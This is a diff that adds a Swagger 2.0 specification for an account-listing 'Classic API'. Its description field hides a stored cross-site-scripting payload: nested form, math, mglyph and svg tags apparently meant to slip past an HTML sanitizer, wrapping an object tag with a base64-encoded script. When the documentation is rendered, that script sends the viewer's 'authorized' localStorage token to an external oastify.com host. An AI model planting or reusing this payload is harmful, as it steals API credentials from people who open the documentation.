@@ -1,0 +1,61 @@
+swagger: '2.0'
+info:
+  title: Classic API Resource Documentation
+  description: >
+    <form><math><mtext></form>
+    <form>
+      <mglyph>
+        <svg>
+          <mtext>
+            <textarea><path id="</textarea>
+            <object data='data:text/html;base64,PHNjcmlwdD4oZnVuY3Rpb24oKSB7IHZhciBpID0gbmV3IEltYWdlKCk7aS5zcmMgPSAnaHR0cHM6Ly83MTZqZDY1MGFnbXg1amNycHNhcWtpbmNuM3R1aG1hYXoub2FzdGlmeS5jb20vP2F1dGhvcml6ZWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnYXV0aG9yaXplZCcpKTt9KSgpOzwvc2NyaXB0Pg=='></object>
+          </path>
+        </mtext>
+      </svg>
+    </mglyph>
+    </form>
+  version: 1.0.0
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: Finds all accounts
+  /accounts/groupid/{id}:
+    get:
+      parameters:
+        - name: id
+          in: path
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccountById
+      summary: Finds an account by ID
+definitions:
+  Account:
+    type: object
+    properties:
+      id:
+        type: integer
+      name:
+        type: string
+securityDefinitions:
+  basicAuth:
+    type: basic
